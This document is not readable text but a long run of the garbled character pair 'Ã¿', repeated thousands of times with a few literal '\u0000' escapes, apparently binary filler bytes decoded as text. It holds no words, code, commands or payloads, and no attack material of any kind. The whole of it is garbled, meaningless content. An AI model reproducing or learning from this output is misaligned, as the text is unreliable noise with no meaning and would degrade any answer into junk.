¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿